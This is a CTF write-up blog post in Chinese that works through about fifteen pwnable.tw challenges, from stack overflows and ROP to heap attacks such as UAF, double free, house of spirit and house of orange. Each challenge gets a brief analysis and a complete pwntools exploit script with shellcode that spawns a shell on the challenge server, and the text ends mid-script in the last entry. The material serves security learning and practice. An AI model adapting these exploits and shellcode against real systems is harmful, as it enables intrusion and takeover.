---
title: pwnable-tw Trip
date: 2019-01-18 12:09:38
tags: pwn updating
layout: post
layout: default
---
pwnable.tw
an interesting trip 

<!--more-->

# Start

checksec发现保护都没开，应该是直接写shellcode然后ret2shellcode。
    
EXP:
```python
from pwn import *
context.log_level='debug'
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
#p=remote("chall.pwnable.tw",10000)
print len(shellcode)
p=process("./start")
print p.recvuntil(":")
raw_input() 
p.sendline("".ljust(20,'x')+p32(0x8048087))
data=p.recv()
leak=(u32(data[:4]))
print hex(leak)
sleep(1)
p.sendline('a'*20+p32(leak+20)+shellcode)
```
   
# ORW
checksec之后依然什么保护都没开于是丢进了IDA
发现使用了PR_GET_NO_NEW_PRIVS 避免安全漏洞，白名单：open，read，write
于是我们可以写shellcode：
open /home/orw/flag
read flag
write flag

```python
from pwn import *
shellcode = ''
shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6fpush 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')
shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')
shellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')
context.log_level='debug'
#p=process("./orw")
p=remote('chall.pwnable.tw',10001)
a=p.recvuntil("code:")
print a
p.send(shellcode)
data=p.recvrepeat(2)
print data
```

# calc
之前一直嫌麻烦没做...本来想着一个小时左右写掉...没想到耗了我...3个小时写exp....

主要的漏洞存在于pool这个结构体和他的计算过程...
```c
struct pool
{
  int idx;
  int num[100];
}
```
eval()
```arm
pool *__cdecl eval(pool *pool, char op)
{
  pool *result; // eax

  if ( op == '+' )
  {
    pool->num[pool->idx - 2] += pool->num[pool->idx - 1];
  }
  else if ( op > '+' )
  {
    if ( op == 45 )
    {
      pool->num[pool->idx - 2] -= pool->num[pool->idx - 1];
    }
    else if ( op == '/' )
    {
      pool->num[pool->idx - 2] /= pool->num[pool->idx - 1];
    }
  }
  else if ( op == '*' )
  {
    pool->num[pool->idx - 2] *= pool->num[pool->idx - 1];
  }
  result = pool;
  --pool->idx;                                  // idx is the num of num ,we can use it to contrul the process
  return result;
}
```
计算过程是先找到离当前位置最近的符号然后调用eval主要的问题是没考虑符号开头的输入，如果遇到符号开头的输入就会把idx改变掉然后后面的计算可能会造成任意地址写
例如`+100+1`
思路就是做ROP...记得ROP_gadget有个打stack link 的程序很好用的命令忘记了...然后写exp写了3个小时...
遇到如下问题
* `sys_execv('sh')`没用一定要是`/bin/sh`而且没有...
* 不能输入字符`0`

采用的方法是read进一个`/bin/sh`用int0x80拿shell
## exp
```python
from pwn import *
def cal(c):
	p.sendline(c)
eax=0x0805c34b
ppp=0x080701d0
int0x80=0x08049a21
read=0x806E6D0
bss=0x080ebf40+0x100
#p=process("./calc")
p=remote("chall.pwnable.tw",10100)
#gdb.attach(p,'b *0x80494a6')
aim=(0xffffd06c-0xffffcaf8)/4+19

cal("+{}+1*{}-1*{}".format(str(aim),str(read+ppp),str(ppp)))
cal("+{}-1*{}-1*{}-1*{}-1*{}+1*{}-1*{}".format(str(aim+2),str(bss),str(bss+100),str(100+ppp),str(ppp),str(1),str(1)))
cal("+{}+1*{}-1*{}+1*{}+1*{}-1*{}".format(str(aim+2+5),str(bss),str(bss-eax),str(eax-0xb),str(0xb+int0x80),str(int0x80)))

p.sendline("nier")
p.send("/bin/sh\x00\n")
sleep(3)
p.sendline("cat /home/calc/flag")
p.interactive()
```



# dubblesort
本题有越界写但是因开着canary所以无法直接改掉ret_address
需要一个关于__isoc99_scanf的技巧
__isoc99_scanf skill... 输入+-时不改变栈上值也可以被%u吸收

## 漏洞点
* 开始的时候有overflow可以泄露libc地址
* size无限制可以做到任意地址写

## 利用
* 泄露libc
* 利用—+构造rop

## EXP
```python
from pwn import *
context.log_level="debug"
#p=process("./dubblesort",env={'LD_PRELOAD':"./libc_32.so.6"})
p=remote("chall.pwnable.tw",10101)
p.sendlineafter("What your name :","A"*24)
p.read(31)
data=p.read(3)
base=(u32("\x00"+data))-(0xf7fb3000-0xf7e03000)
print hex(base)
#gdb.attach(p,'')

size=24+7+4
p.sendlineafter("to sort",str(size))
sleep(0.1)
i=0;
while(1):
	p.sendlineafter("number : ","0")
	sleep(0.1)
	i+=1
	if i==24:
		break;
p.sendlineafter("number : ","+")
sleep(0.1)
libc=ELF("./libc_32.so.6")
libc.address=base
system=libc.symbols['system']
sh=libc.search("/bin/sh").next()
log.warning(hex(system))
log.warning(hex(sh))
payload=system
p.sendlineafter("number : ",str(payload))
p.sendlineafter("number : ",str(payload))
p.sendlineafter("number : ",str(payload))
p.sendlineafter("number : ",str(payload))
p.sendlineafter("number : ",str(payload))
p.sendlineafter("number : ",str(payload))
p.sendlineafter("number : ",str(payload))
p.sendlineafter("number : ",str(payload))
p.sendlineafter("number : ",str(sh))
p.sendlineafter("number : ",str(sh))

p.interactive()
```
ps:玄学问题...我输入34个不成功...execve的环境变量可能有问题 输入35个最后一个用sh地址盖掉就成功了....


# hacknote
经典的uaf

## 漏洞点
```
if ( ptr[cmd] )
  {
    free(ptr[cmd]->Content);
    free(ptr[cmd]);
    puts("Success");
  }
```
free后并未置空

## 漏洞利用
* 有函数指针的使用
* 想办法盖掉函数指针或者参数来实现自己的目的
* 先泄露地址就盖掉参数
* 把原来的函数指针指向system执行system("addr;sh"); 或者||也都可以用

## EXP
```python
from pwn import *
def cmd(c):
	p.sendlineafter("Your choice :",str(c))
def add(size,c):
	cmd(1)
	p.sendlineafter("Note size :",str(size))
	p.sendafter("Content :",c.ljust(size,'\0'))
def printf(i):
	cmd(3)
	p.sendlineafter("Index :",str(i))
def remove(i):
	cmd(2)
	p.sendlineafter("Index :",str(i))
context.log_level="debug"
#p=process("./hacknote",env={"LD_PRELOAD":"./libc_32.so.6"})
p=remote("chall.pwnable.tw",10102)
libc=ELF("./libc_32.so.6")
log.warning(hex(libc.symbols['puts']))
log.warning(hex(libc.symbols['system']))
bin=ELF("./hacknote")
add(8,"A")
add(24,"/nier")
remove(0)
remove(1)
add(8,p32(0x804862B)+p32(0x804a024))
printf(0)
data=p.read(4)
libc.address=u32(data)-libc.symbols['puts']
log.warning(hex(libc.address))
remove(2)
add(8,p32(libc.symbols['system'])+"||sh")
printf(0)
p.sendline("cat /home/hacknote/flag")
p.interactive(">")
```
# Silver_bullet
## Analysis
* 三个功能
* 创建，升级，打怪
比较简单漏洞点在
```arm
strncat(s, &buf, 0x30 - *((_DWORD *)s + 12));
```
strncat如果填满会在size位填上0覆盖掉之前的size造成第二次利用升级功能时会溢出
## 思路
* 创建，升级造成溢出
* 构造rop泄露地址
* 打怪退出 得到泄露 返回main
* 以上再做一次get shell

## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def bt(name):
	cmd(1)
	p.sendafter("bullet :",name)
def pt(name):
	cmd(2)
	p.sendafter("bullet :",name)
#p=process("./silver_bullet",env={'LD_PRELOAD':"./libc_32.so.6"})
p=remote("chall.pwnable.tw",10103)
bt("A"*0x28)
pt("A"*8)
put=0x80484A8
main=0x8048954
got=0x804afdc
context.log_level='debug'
pt("\xff\xff\xff"+p32(0xdeadbeef)+p32(put)+p32(main)+p32(0x804afdc))
cmd(3)
p.readuntil("!!\n")
base=u32(p.read(4))-(0xf75e6140-0xf7587000)
log.warning(hex(base))
#gdb.attach(p)
libc=ELF("./libc_32.so.6")
bt("A"*0x28)
pt("A"*8)
libc.address=base
pt("\xff\xff\xff"+p32(0xdeadbeef)+p32(0xf7578940-0xf753e000+base)+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next()))
cmd(3)
p.sendline("cd /home/silver_bullet")
p.interactive("nier >>>>")
```

# seethefile

IO_FILE 利用
## Analysis
主要功能是读文件然后留下姓名走人....
所以可以利用/proc/sys/self/maps 来泄露地址
之后留名字存在溢出
```c
case 5:
        printf("Leave your name :");
        __isoc99_scanf("%s", &name);
        printf("Thank you %s ,see you next time\n", &name);
        if ( fp )
          fclose(fp);
        exit(0);
        return;
```
可以溢出到fp指针然后fclose可以利用IO_FILE
## EXP
```python
from pwn import *

def cmd(c):
	p.sendlineafter("Your choice :",str(c))
def op(name):
	cmd(1)
	p.sendlineafter("What do you want to see :",(name))
def show():
	cmd(2)
	cmd(3)

p=process("./seethefile")
#p=remote("chall.pwnable.tw",10200,timeout=5)
op("/proc/self/maps")
cmd(2)
show()
p.readline()
p.readline()
base=int("0x"+p.read(8),16)
log.warning(hex(base))
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
#gdb.attach(p,'b *0xf7e6d91f')
buf=0x804B260
libc.address=base
payload="/bin/sh"
payload=payload.ljust(0x20,'\x00')+p32(buf)+0x24*"\x00"+p32(buf+0x10)
payload=payload.ljust(0x94,'\x00')
payload+=p32(buf-0x44+0x98)+p32(libc.symbols['system'])
p.sendlineafter("Your choice :","5")
p.sendafter("eave your name :",payload+"\n")
p.interactive()
```
# applestore

一开始以为是uninitialize 后来发现并不能利用...在网上看了师傅们的wp发现是和之前一题一样做的stack migration.
把栈移到got上这样就可以利用开始的my_read和atoig去getshell

## analysis
情境应该是apple商店可以买apple产品到购物车，购物车里的apple产品是以双链表的形式储存结构如下
```c
phone
{
    void * name;
    int price;
    phone * next;
    phone * pre; 
}
```
一个比较有趣的点是只要消费满7174 进入checkout 就会赠送一美元一个的iPhone8
这个iphone比较有关键它是在stack上的这样的话我们的链表会指向栈上而栈可以被我们控制(输入index的时候有15bytes)我们就可以干些事情
## 利用思路

* 先买到iphone8
* 利用delect里的输入覆盖掉iphone8的name 泄露libc & stack 
* 构造一个fake phone如下
```c
name = 0xdeadbeef
price= 0xdeadbeef
next = &ebp-12
pre  = atoi_got+0x22
```
* 利用delect 掉iphone 8 进行swap,进入handle之后ebp变成atoi_got +0x22 
* 利用my_read 做got hijacking
* 利用read_cmd getshell:p64(system)+";"+"/bin/sh;"

## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(idx=1):
	cmd(2)
	p.sendlineafter("ber> ",str(idx))
def show(c='y'):
	cmd(4)
	p.sendlineafter("n) > ",c)
def free(c):
	cmd(3)
	p.sendafter("ber> ",c)
def pay():
	cmd(5)
	p.sendlineafter("n) > ","y")
context.log_level='debug'		
atoi=0x804b040
p=process("./applestore")
for x in range(6):
	add()
for x in range(20):
	add(2)

pay()

free("27"+p32(atoi)+p64(0)*2+"\n")
p.readuntil("27:")
base=u32(p.read(4))-(0xf7e33250-0xf7e06000)
log.warning(hex(base))
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc.address=base


free("27"+p32(libc.symbols['environ'])+p64(0)*2+"\n")
p.readuntil("27:")
stack=u32(p.read(4))-(0xffffd0fc-0xfffdd000)
log.warning(hex(stack))
ebp=0xffffcff8-0xfffdd000+stack

#free("27"+p32(0x0804b000)+p32(0)+p32(0)+p32(0)+p32(0)+'\n')
free("27"+p32(0x0804b000)+p32(0xdeadbeef)+p32(ebp-12)+p32(atoi+0x22)+'\n')
cmd(p32(libc.symbols['system'])+";"+'/bin/sh;')
gdb.attach(p,'b * 0x8048A44')
p.interactive("nier >>>")
```



# Death Note
死亡笔记...记名字...名字不能是不可显示字符
主要的漏洞点是下标越界比较好看出来
```arm
if ( idx > 10 )
  {
    puts("Out of bound !!");
    exit(0);
  }
```
然后越界之后就可以任意地址写了但是只能写0x50bytes还有就是必须是可显示字符
```sh
➜  Desktop checksec death_note 
[*] '/home/n132/Desktop/death_note'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

```
所以可以写改写(add)某个函数的`got`然后就通过call那个函数直接跳我们的输入了
漏洞点比较简单..主要是可显示字符的限制
于是乎先去找可显示字符的机器码..找到了某个大佬归纳的资料
```sh
1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0

当然，上面汇编指令中的立即数大小也需要在可打印字符范围内。
```

然后经过长时间探索...我的方法最终成功了刚刚看了看大家的我感觉我的shellcode还是挺短的

* int 0x80通过sub byte ptr[eax + 0x23] , dl来获得(先pop eax得到一个heap上地址 然后可以对其做一些操作变成自己想要的值 dl通过 push pop 来设置)例如:
```s
sub al,0x2e
sub byte ptr[eax + 0x23] , dl
sub byte ptr[eax + 0x23] , dl
push 0x33
pop edx
sub byte ptr[eax + 0x22] , dl
pop edx
```
* 为了更容易得到sh我改写的是free的got
* 实地考察发现在call free的时候ebx=0& ecx=0 & eax=address_of_/bin/sh
* 所以我们只需要用push pop sub搞出个0xb就可以了
具体shellcode如下
```python
shellcode='''
push eax
pop ebx
pop eax
pop eax
push edx
push 0x40
pop edx

sub al,0x2e
sub byte ptr[eax + 0x23] , dl
sub byte ptr[eax + 0x23] , dl
push 0x33
pop edx
sub byte ptr[eax + 0x22] , dl
pop edx

push 0x6b
pop eax
sub al,0x60
'''
```

## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(idx,name="A\n"):
	cmd(1)
	p.sendlineafter("Index :",str(idx))
	p.sendafter("Name :",name)
def show(idx):
	cmd(2)
	p.sendlineafter("Index :",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Index :",str(idx))
def pwn(addr):
	idx=0xffffffff
	while(addr!=(idx*4+0x804a060) % 0x100000000):
		idx-=1
	return idx-0x100000000
#context.log_level='debug'
shellcode='''
push eax
pop ebx
pop eax
pop eax
push edx
push 0x40
pop edx

sub al,0x2e
sub byte ptr[eax + 0x23] , dl
sub byte ptr[eax + 0x23] , dl
push 0x33
pop edx
sub byte ptr[eax + 0x22] , dl
pop edx

push 0x6b
pop eax
sub al,0x60
'''
shellcode=asm(shellcode)
'''
for x in shellcode:
	if ord(x) <= 31 or  ord(x)>=127:
		warning("{} unable to print".format(hex(ord(x))))
print len(shellcode)
'''
p=process("./death_note")
p=remote("chall.pwnable.tw",10201)
#gdb.attach(p,'b *0x8048873')
add(pwn(0x804a014),shellcode+"\n")
add(1,"/bin/sh\n")
free(1)
p.interactive()
```
手撸可见字符的shellcode挺有意思的

# Spirited Away
神寻...谷歌翻译 挺给力的...结果居然变成了千与千寻...
感觉还是神寻好.
感觉找到了house of spirit 的发源地

```s
➜  Desktop checksec spirited_away 
[*] '/home/n132/Desktop/spirited_away'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```
简单来说这个是个留言系统...
留下名字 年龄 观看理由 评价输出一遍之后问你是不是还要留言

主要的漏洞点有两个:
* reason在stack 上但是一次也没有memset为0可以通过设置reason的长度泄露stack & base of libc
* 溢出漏洞
`sprintf(&v1, "%d comment so far. We will review them as soon as we can", cnt);`
`char v1; // [esp+10h] [ebp-E8h]`
`size_t nbytes; // [esp+48h] [ebp-B0h]`
这里只要len v1 大于1那么就会溢出到nbytes导致name 和 comment可以溢出

## 利用思路
* 留言100次将nbytes覆盖为0x6e（如果我没记错）
* 这样comment可以溢出到buf指针做到任意地址free
* 利用reason在栈上构造`chunk`的head和`next_chunk`的head
* house of spirit 控制 reason内开始长度为0x6e的区域
* rop to get shell

## 遇到的一点小麻烦
* 因为用的是ubuntu 16 开始的时候用env={'LD_PRELOAD'...}做然后用的system('/bin/sh')发现本机都pwn不掉...后来尝试了一下execve就可以了
* 本地可以pwn远端打不下来...发现直接用stack 上随便的libc内地址玄学地本机和远端不一样导致libc基址计算错误...改用另一个地址就可以了..
* 虽然远端很慢...千万不要边打边看视频打通之后立刻就断掉了...然后我傻逼的以为自己还有哪里错了
做这题主要困在这些小麻烦上.../捂脸哭

## exp

```python
from pwn import *
def sname(name):
	p.readuntil("\nPlease enter your name: ")
	p.send(name)
def sage(age):
	p.sendlineafter("Please enter your age: ",str(age))
def sr(reason):
	p.sendafter("Why did you came to see this movie? ",reason)
def sc(comment):
	p.sendlineafter("Please enter your comment: ",comment)
def raw(reason='nier',name='nier',age=1,comment="nier"):
	sname(name)
	sage(age)
	sr(reason)
	sc(comment)
def sall(reason='nier',name='nier',age=1,comment="nier"):
	sname(name)
	sage(age)
	sr(reason)
	sc(comment)
	p.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
def sall_10(reason='nier',name='nier',age=1,comment="nier"):

	sage(age)
	sr(reason)

	p.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
#p=process("./spirited_away",env={"LD_PRELOAD":'./libc'})
p=remote("chall.pwnable.tw",10204)
#context.log_level='debug'
libc=ELF("./libc")

raw("A"*0x18)
p.readuntil("A"*0x18)
libc.address = u32(p.recv(4))-libc.sym['_IO_file_sync']-7
p.recvuntil("comment? <y/n>: ")
p.send("y")


base=libc.address

raw("A"*56)
p.readuntil('A'*56)
stack=u32(p.read(4))
p.sendlineafter("<y/n>: ","y")

log.warning(hex(base))
log.warning(hex(stack))
for x in range(8):
	sall()

for x in range(90):
	sall_10()
for x in range(4):
	sall()


sname("yy")
sage(1)
sr(p32(0x41)*20)
sc("A"*0x50+p32(1)+p32(0xffffcff8-0xffffd048+stack-0x18))
p.sendlineafter("<y/n>: ","y")
#libc=ELF("./spirited_away").libc

libc.address=base
sname("/bin/sh".ljust(4*18,'\x00')+p32(0xdeadbeef)+p32(libc.symbols['execve'])+p32(0xdeadbeef)+p32(0xffffcff8-0xffffd048+stack-0x18)+p32(0)+p32(0))
sage(1)
sr("no")
sc("no")
#gdb.attach(p,'b *0x8048891')
p.sendlineafter("<y/n>: ","n")
p.sendline("cat /home/spirited_away/flag")
p.interactive("nier>>")
```
house of spirit 应该是从这里来吧...

# Secretgarden
```sh
➜  Desktop checksec secretgarden
[*] '/home/n132/Desktop/secretgarden'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```
秘密花园...常规的`double free`...做到堆题感觉比前面简单多了...看来我的stack方面或者漏洞挖掘方面太弱了
花的结构体
```c
struct Flower{
  int inuse;
  char * name;
  char[24] color;
}
```
主要漏洞点在:remove中
```arm
 if ( idx <= 0x63 && (v1 = array[idx]) != 0LL )
  {
    *v1 = 0;
    free(*(array[idx] + 8LL));
    result = puts("Successful");
  }
```
可以`double_free`
泄露地址因为read的时候没有截断直接free进`unsorted bin`然后malloc出来show出来就可以了

## 思路
* leak libc
* double free
* jump one_gadget
## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("choice : ",str(c))
def add(name="XXXX",l=0x80,c="AAAA"):
	cmd(1)
	p.sendlineafter("name :",str(l))
	p.sendafter("flower :",name)
	p.sendlineafter("flower :",c)
def show():
	cmd(2)
def free(idx):
	cmd(3)
	p.sendlineafter("garden:",str(idx))
def clear():
	cmd(4)
#p=process("secretgarden",env={"LD_PRELOAD":"./libc_64.so.6"})
p=remote("chall.pwnable.tw",10203)
context.arch='amd64'
add()#0
add()#1
free(0)
clear()
add("A")
#context.log_level='debug'
show()
p.readuntil("Name of the flower[0] :")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b41-0x7ffff7a0d000)+0x1000
#libc=ELF("./secretgarden").libc
libc=ELF("./libc_64.so.6")
libc.address=base
log.warning(hex(base))

add("nier",0x68)#2
add("nier",0x68)#3
add()
free(2)
free(3)
free(2)
clear()
add(p64(libc.symbols['__malloc_hook']-35),0x68)#2
add("\n",0x68)#3
add("\n",0x68)#2
add("\x00"*19+p64(0xef6c4+base),0x68)#2
free(2)
free(2)
#gdb.attach(p)
p.interactive()
```

# Babystack

```
➜  Desktop checksec babystack
[*] '/home/n132/Desktop/babystack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```
漏洞点也比较简单
```arm
int __fastcall check(const char *sec)
{
  size_t len; // rax
  char s; // [rsp+10h] [rbp-80h]

  printf("Your passowrd :");
  do_read((unsigned __int8 *)&s, 0x7Fu);
  len = strlen(&s);
  if ( strncmp(&s, sec, len) )
    return puts("Failed !");
  Login = 1;
  return puts("Login Success !");
}
```
首先是登录.因为这里用的len是我们输入的len所以我们可以用00截断例如输入'\x00'我们就可以根据返回来爆破随机数

然后是复制功能复制的时候用了`strcpy(a1, &src);`
而且src没有初始化所以我们可以先在check里面在栈上留下东西然后会在strcpy的时候也一同复制过去

## 思路
* 通过爆破获得随机数（为了绕最后的类似canary）
* 通过未初始化变量和strcpy做buffer overflow
* 因为地址无法将8字节填满所以只能使用一个地址因为没有后门然后又提供了libc所以就去找泄露跳one_gadget
* 没有输出点但是可以通过吧一些东西移到本来是随机数的地方然后爆破出来
* 恰好strcpy之后移上去的后8字节是libc内地址爆出来之后跳one_gadget
## exp
```python
from pwn import *
def cmd(c):
	p.sendafter(">> ",c)
def cmp(payload):
	cmd("1\n")
	p.sendafter("owrd :",'{}\x00'.format(payload))
	res=p.readline()
	return res
#p=process("./babystack",env={'LD_PRELOAD':'./libc_64.so.6'})
p=remote("chall.pwnable.tw",10205)
#context.log_level='debug'
sec=""

for y in range(0x10):
	for x in range(1,256):
		if "Success" in cmp(sec+chr(x)):
			cmd("1\n")
			sec+=chr(x)
			break
log.success("====PartI Finished====")
pay="\x00"
pay=pay.ljust(0x48,'\xaa')
cmd("1\n")
p.sendafter("owrd :",'{}'.format(pay))
cmd("3\n")
p.sendafter("Copy :","A"*0x3f)
# now we can burp the libc_base
nier='\xaa'*8
cmd("1\n")
for y in range(0x6):
	for x in range(1,256):
		if "Success" in cmp(nier+chr(x)):
			cmd("1\n")
			nier+=chr(x)
			break
base=u64(nier[8:].ljust(8,'\x00'))-(0x7ffff7a85439-0x00007ffff7a0d000)
log.warning(hex(base))
log.success("====PartII Finished====")

pay='\x00'+'\xdd'*0x3f+sec+p64(0xdeadbeefdeadbeef)+"\xDD"*0x10+p64(base+0x45216)
pay=pay.ljust(0x7f,'\xaa')
cmd("1\n")
p.sendafter("owrd :",'{}'.format(pay))
cmd("3\n")
p.sendafter("Copy :","A"*0x3f)
#gdb.attach(p,'b * 0x000000000000EBB+0x0000555555554000')
#0x7fffffffde50 sec
cmd("2\n")
log.success("====Pwned====")
p.sendline("cat /home/babystack/flag")
p.interactive()
#0x7fffffffdd80
```
远端非常慢....挑早上打。。还是能成功的

# alive_note
在Death_note上升级的一道题
主要是限制了输入必须是 字母或者数字
而且一次只能输入8bytes

我们要解决几个问题
* /bin/sh无法输入
所以我们需要调用read..那么目标变成了直接用read读shellcode进去跳shellcode
所以我们需要
```s
eax=3
ebx=0
ecx=已知的地址
edx=xx
```
设置寄存器如果数字较小的话我们可以直接inc上去比较大的话我们push 进去之后pop 出来

改写free_got所以eax是将要被free的地址
我们可以set为ecx的值

* int 0x80也就是\xcd\x80需要自己通过运算得出
还好xor [reg+0x??],reg还是可以用的
我们可以先dec 一个为0的寄存器 得出0xffffffff
这样就可以比较方便的xor出\xcd\x80
## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(idx,name="A\n"):
	cmd(1)
	p.sendlineafter("Index :",str(idx))
	p.sendafter("Name :",name)
def show(idx):
	cmd(2)
	p.sendlineafter("Index :",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Index :",str(idx))
def pwn(addr):
	idx=0xffffffff
	while(addr!=(idx*4+0x804a080) % 0x100000000):
		idx-=1
	return idx-0x100000000
#context.log_level='debug'
p=remote("chall.pwnable.tw",10300)
#p=process("./alive_note")
#gdb.attach(p,'b *0x80488ea')
p1='''
push eax
pop ecx
dec edx
push edx
pop eax
inc edx
'''
p2='''
xor [ecx+0x41],ax
inc edx
inc edx
'''
p3='''
inc edx
inc edx
inc edx
push edx
pop eax
dec edx
'''
p4='''
dec edx
xor [ecx+0x42],ax
push edx
'''
p5='''
pop eax
push 0x7a
pop edx
push 0x69
'''
p1=asm(p1)
p2=asm(p2)
p3=asm(p3)
p4=asm(p4)
p5=asm(p5)
add(pwn(0x804a014),p1+"q8")
add(1)
add(1)
add(1)
add(1,p2+'q8')
add(2)
add(2)
add(2,'\x32\x7a')
add(2,p3)
add(3)
add(3)
add(3)
add(3,p4+'q8')
add(4)
add(4)
add(4)
add(4,p5+'q'+'\x39')
add(5,'\x69\x32\x7a')
add(5,'\x69\x32\x7a')
add(5,'\x69\x32\x7a')
add(5,'\x69\x32\x7a')
add(5,'\x69\x32\x7a')
free(4)
context.arch='i386'
shellcode="\x90"*70+asm(shellcraft.sh())
p.send(shellcode)
slee(1)
p.sendline("cat /home/alive_note/flag")
p.interactive(">> nier ")
```


# Bookwriter
第一眼看过去的时候那个index8的洞是发现了...结果看都不看以为是自己看错了...后来山穷水尽的时候回头去看再发现了add的时候idx最大为8其他操作为7
也就是
* 可以吧idx=0的pagesize设置为0这样可以add8次，通过`edit(0,"\x00"+pay)`的形式来重制idx=0的size

* set_name的时候可以泄露heap地址后来发现没什么用...反正后面可以泄露

* edit存在bytes_off,可以edit两次来更改下一个chunk的head

一开始看到了没有free 想到了sysmalloc 和house of orange 但是感觉pwnable.tw应该没有那么快就orange了..于是乎想用force来做.于是探索了半天发现输入函数的atoi决定了不能用hose of force...

## 思路
house of orange
* sysmalloc 获得一个unsorted bin（大一点可以同时泄露heap和libc_base）
* leak libc&heap
* house of orange
## exp
```python
from pwn import *
def setname(c="nier"):
	p.sendafter("Author :",c)
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(size,c="nier"):
	cmd(1)
	p.sendlineafter("page :",str(size))
	p.sendafter("Content :",c)
#	sleep(1)
def show(idx):
	cmd(2)
	p.sendlineafter("page :",str(idx))
#	sleep(1)
def edit(idx,c):
	cmd(3)
	p.sendlineafter("page :",str(idx))
	p.sendafter("Content:",c)
#	sleep(1)
name="./bookwriter"
if 0:
	p=process(name,env={'LD_PRELOAD':'./libc_64.so.6'})
#	libc=ELF(name).libc
	libc=ELF("./libc_64.so.6")
else:
	p=remote("chall.pwnable.tw",10304)
	libc=ELF("./libc_64.so.6")
setname("A"*0x40)
#context.log_level='debug'
#
cmd(1)
p.sendlineafter("page :",'0')
#
add(0x28)#1
edit(1,"A"*0x28)
edit(1,"A"*0x28+'\xb1'+'\x0f'+'\x00')
add(0x1008,"A"*0x10)#2
# sysmalloc

add(0x28,"A")#3
show(3)
p.readuntil("Content :\n")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd2141-0x00007ffff7a0d000)+0x1000
edit(3,"A"*0x10)
show(3)
p.readuntil("A"*0x10)
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x50
add(0x28)
add(0x28)
add(0x28)
add(0x28)
add(0x28,"A"*0x28)

libc.address=base
fake_struct_address=0x603170-0x603000+heap
fake_struct="/bin/sh\x00"+p64(0x61)
fake_struct+=p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)
fake_struct+=p64(0)+p64(1)
fake_struct=fake_struct.ljust(0xa0,'\x00')+p64(fake_struct_address+0x8)
fake_struct =fake_struct.ljust(0xc0,'\x00')+p64(1)
fake_struct = fake_struct.ljust(0xd8, '\x00')+p64(fake_struct_address+0xd8-0x10)+p64(libc.symbols['system'])

edit(0,"\x00"*(0x603170-0x603010)+fake_struct+"\n")

log.warning(hex(heap))
log.warning(hex(base))
cmd(1)
p.sendlineafter("page :",str(1))
p.sendline("cat /home/bookwriter/flag")
p.interactive()
```
# Secret of my heart
比较常规的off by null byte
是 [HITCON2018_babyheap][2] 的简单版
利用思路在这里就简单叙述了
* 利用null byte off 造成over flow
* 泄露libc base
* fastbin atk
* call system

## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(size,c="n132",name="A"*0x20):
	cmd(1)
	p.sendlineafter("Size of heart : ",str(size))
	p.sendafter("Name of heart :",name)
	p.sendafter("my heart :",c)
def free(idx):
	cmd(3)
